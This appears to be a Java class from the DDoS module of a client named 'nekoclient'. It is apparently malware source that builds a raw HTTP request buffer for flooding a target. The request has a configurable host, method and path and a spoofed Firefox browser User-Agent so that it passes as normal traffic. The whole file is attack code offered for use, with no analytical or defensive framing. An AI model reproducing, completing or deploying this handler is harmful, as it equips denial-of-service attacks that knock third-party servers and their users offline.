package dev.neko.nekoclient.api.ddos.impl.handler.impl.http;

import com.eclipsesource.json.JsonObject;
import dev.neko.nekoclient.api.ddos.Protocol;
import dev.neko.nekoclient.api.ddos.impl.handler.BufferWritingMethodHandler;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;

public class HttpDefaultMethod extends BufferWritingMethodHandler {
   @Override
   public void init(Protocol protocol, InetSocketAddress address, String originalHost, JsonObject options) throws IOException {
      String host = options.getString("host", originalHost);
      String method = options.getString("method", "GET");
      String path = options.getString("path", "/");
      String accept = options.getString("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
      String userAgent = options.getString("userAgent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0");
      this.buffer = ByteBuffer.wrap(
         (method
               + " "
               + path
               + " "
               + "HTTP/1.1"
               + "\r\n"
               + "Accept: "
               + accept
               + "\r\n"
               + "Accept-Language: en-US,en;q=0.5"
               + "\r\n"
               + "User-Agent: "
               + userAgent
               + "\r\n"
               + "Connection: keep-alive"
               + "\r\n"
               + "Host: "
               + host
               + "\r\n"
               + "\r\n")
            .getBytes()
      );
   }
}
